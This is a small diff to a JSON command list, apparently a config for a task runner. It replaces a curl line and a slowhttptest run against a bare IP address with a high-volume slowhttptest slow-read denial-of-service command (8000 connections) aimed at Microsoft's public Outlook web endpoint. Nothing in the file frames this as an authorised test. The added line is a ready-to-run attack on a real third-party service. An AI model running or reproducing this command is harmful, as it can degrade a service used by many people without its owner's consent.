@@ -1,6 +1,5 @@
 {
 "cmds":[
-	"curl www.baidu.com",
-	"slowhttptest -H -c 2000 -g -o output -i 10 -r 300 -t GET -u http://106.75.104.184:7000 -x 24 -p 3"
+	"slowhttptest -c 8000 -X -g -o output -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://outlook.live.com/owa/ -p 3"
 	]
 }
